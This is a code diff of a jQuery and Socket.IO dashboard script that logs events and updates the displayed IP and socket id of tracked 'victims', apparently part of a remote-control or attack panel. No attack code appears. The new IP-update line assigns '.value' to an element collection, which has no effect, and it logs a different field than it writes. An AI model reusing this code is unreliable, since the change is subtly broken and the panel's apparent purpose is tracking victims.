@@ -66,8 +66,7 @@ $(document).ready(function (){
             }
           });
           
-         
-        }else{
+        } else {
           $.ajax({
             url: '/log',
             type: 'post',
@@ -97,13 +96,12 @@ $(document).ready(function (){
       })
 
       socket.on('update victim ip', function(msg) {
-        var ip = document.getElementsByClassName(`ip-address-${msg['data'][0]}`)
-        // set ip text msg['ipaddress']
+        document.getElementsByClassName(`ip-address-${msg['data'][0]}`).value = msg['data'][2]
         $.ajax({
             url: '/log',
             type: 'post',
             data: {
-              'data' : `${msg['data'][0]} IP address changed to ${msg['data'][1]}`,
+              'data' : `${msg['data'][0]}: IP address changed to ${msg['data'][1]}`,
               'highlight' : 'light'
             },
             success: function(data){
@@ -111,6 +109,20 @@ $(document).ready(function (){
             }
         });
       });
+
+      socket.on('log', function(msg) {
+        $.ajax({
+            url: '/log',
+            type: 'post',
+            data: {
+              'data' : msg['data'][0],
+              'highlight' : msg['data'][1]
+            },
+            success: function(data){
+                $('.log-class').append(data.htmlresponse);
+            }
+        });
+      })
 
       socket.on('update victim socketid', function(msg) {
         var socketid = document.getElementsByClassName(`socket-id-${msg['data'][0]}`)
